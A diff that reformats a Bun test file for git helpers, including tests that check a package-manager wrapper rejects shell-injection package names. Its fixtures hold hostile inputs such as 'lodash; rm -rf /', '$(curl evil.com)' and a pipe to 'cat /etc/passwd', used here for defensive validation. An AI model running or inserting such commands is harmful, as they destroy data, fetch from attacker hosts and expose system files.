@@ -1,4 +1,4 @@
-import { test, expect, describe } from 'bun:test';
+import { describe, expect, test } from 'bun:test';
 import { generateBranchName, managePackages } from './git-ops';
 
 describe('generateBranchName', () => {
@@ -15,7 +15,8 @@ describe('generateBranchName', () => {
   });
 
   test('long title is truncated to 40 chars (slug portion)', () => {
-    const longTitle = 'Implement the very long feature that nobody asked for but we build it anyway';
+    const longTitle =
+      'Implement the very long feature that nobody asked for but we build it anyway';
     const result = generateBranchName(99, longTitle);
 
     // The slug part (before -99) should be at most 40 chars,
@@ -39,39 +40,33 @@ describe('generateBranchName', () => {
 
 describe('managePackages validation', () => {
   test('rejects empty packages string', async () => {
-    await expect(managePackages('/tmp', 'add', '')).rejects.toThrow(
-      'No package names provided'
-    );
+    await expect(managePackages('/tmp', 'add', '')).rejects.toThrow('No package names provided');
   });
 
   test('rejects whitespace-only packages string', async () => {
-    await expect(managePackages('/tmp', 'add', '   ')).rejects.toThrow(
-      'No package names provided'
-    );
+    await expect(managePackages('/tmp', 'add', '   ')).rejects.toThrow('No package names provided');
   });
 
   test('rejects shell injection via semicolon', async () => {
-    await expect(
-      managePackages('/tmp', 'add', 'lodash; rm -rf /')
-    ).rejects.toThrow('Invalid package name');
+    await expect(managePackages('/tmp', 'add', 'lodash; rm -rf /')).rejects.toThrow(
+      'Invalid package name',
+    );
   });
 
   test('rejects backtick injection', async () => {
-    await expect(
-      managePackages('/tmp', 'add', '`whoami`')
-    ).rejects.toThrow('Invalid package name');
+    await expect(managePackages('/tmp', 'add', '`whoami`')).rejects.toThrow('Invalid package name');
   });
 
   test('rejects $() injection', async () => {
-    await expect(
-      managePackages('/tmp', 'add', '$(curl evil.com)')
-    ).rejects.toThrow('Invalid package name');
+    await expect(managePackages('/tmp', 'add', '$(curl evil.com)')).rejects.toThrow(
+      'Invalid package name',
+    );
   });
 
   test('rejects pipe injection', async () => {
-    await expect(
-      managePackages('/tmp', 'add', 'lodash | cat /etc/passwd')
-    ).rejects.toThrow('Invalid package name');
+    await expect(managePackages('/tmp', 'add', 'lodash | cat /etc/passwd')).rejects.toThrow(
+      'Invalid package name',
+    );
   });
 
   test('accepts valid simple package name', async () => {
